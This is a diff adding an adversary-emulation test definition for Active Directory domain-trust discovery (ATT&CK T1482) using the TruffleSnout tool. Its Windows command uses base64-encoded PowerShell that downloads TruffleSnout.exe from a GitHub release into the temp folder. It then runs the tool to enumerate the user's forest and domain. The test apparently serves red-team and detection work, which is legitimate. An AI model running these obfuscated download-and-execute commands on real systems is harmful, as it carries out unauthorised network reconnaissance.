@@ -1,0 +1,17 @@
+- id: c2445008-236c-53ab-a3de-6e0e8a777284
+  name: Soumaia ART Tests - TruffleSnout - Listing AD Infrastructure
+  description: Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout
+  tactic: discovery
+  technique:
+    attack_id: T1482
+    name: Domain Trust Discovery
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABUAHIAdQBmAGYAbABlAFMAbgBvAHUAdAAuAGUAeABlACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgACgAUwBwAGwAaQB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABUAHIAdQBmAGYAbABlAFMAbgBvAHUAdAAuAGUAeABlACIAKQAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZABzAG4AZQB6AGgAawBvAHYALwBUAHIAdQBmAGYAbABlAFMAbgBvAHUAdAAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADAALgA1AC8AVAByAHUAZgBmAGwAZQBTAG4AbwB1AHQALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFQAcgB1AGYAZgBsAGUAUwBuAG8AdQB0AC4AZQB4AGUAIgAKAA==
+          )
+          "%TEMP%\ART-ExternalPayloads\TruffleSnout.exe" forest -n %userdomain%
+          "%TEMP%\ART-ExternalPayloads\TruffleSnout.exe" domain -n %userdomain%
